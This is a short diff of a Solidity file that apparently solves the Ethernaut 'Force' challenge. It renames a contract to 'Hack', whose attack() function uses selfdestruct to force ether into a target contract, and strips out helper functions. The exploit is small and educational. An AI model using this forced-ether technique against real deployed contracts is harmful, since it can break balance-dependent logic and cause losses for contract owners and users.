@@ -2,7 +2,6 @@
 pragma solidity ^0.8.7;
 
 contract Force {/*
-
                    MEOW ?
          /\_/\   /
     ____/ o o \
@@ -10,28 +9,12 @@ contract Force {/*
  (______)__m_m)
 
 */
-
-
-  function getBalance() public view returns(uint){
-      return address(this).balance;
-  }
-  
-
 }
-contract SampleERC721  {
+contract Hack  {
 
-
-  function getBalance() public view returns(uint){
-      return address(this).balance;
-  }
-
+  // Self destruct destroys the contract and send all the balance to a given a address 
     function attack(address addr) public payable {
         selfdestruct(payable(addr));
-    }
-
-    function getData() public pure returns(bytes memory) {
-      //0xa3e76c0f
-      return abi.encodeWithSignature("receive()");
     }
 
     receive() external payable {
